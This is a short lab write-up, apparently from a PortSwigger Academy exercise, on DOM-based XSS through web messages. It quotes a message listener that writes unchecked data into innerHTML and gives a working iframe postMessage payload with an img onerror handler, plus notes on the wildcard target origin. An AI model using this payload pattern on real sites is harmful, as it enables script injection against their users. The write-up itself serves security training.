# [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

> on the page there is a `"message"` event listener

```
<script>
  window.addEventListener("message", function (e) {
    document.getElementById("ads").innerHTML = e.data;
  });
</script>
```

> this script has two issues:

- No origin check, `e.origin` is never inspected, so any window can send it data
- Unsafe sink, `e.data` flows directly into `innerHTML`

> send to this event listener a "message"

```
<iframe src="https://xxx.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

- in an `iframe` posting a message to its content `window` object a broken image
- `this.contentWindow.postMessage()` posts the message to its content
- `.postMessage()` first argument is the data (the broken image in this case)
- `.postMessage()` second argument, the `targetOrigin` specifies if the `iframe` content origin is the same as the `targetOrigin` then its sends the message, otherwise not
- but `.postMessage(...,'*')`, `'*'` as `targetOrigin` is a wildcard that tells that don't care of the origin of receiver
- `e.origin` and `targetOrigin` is not the same value
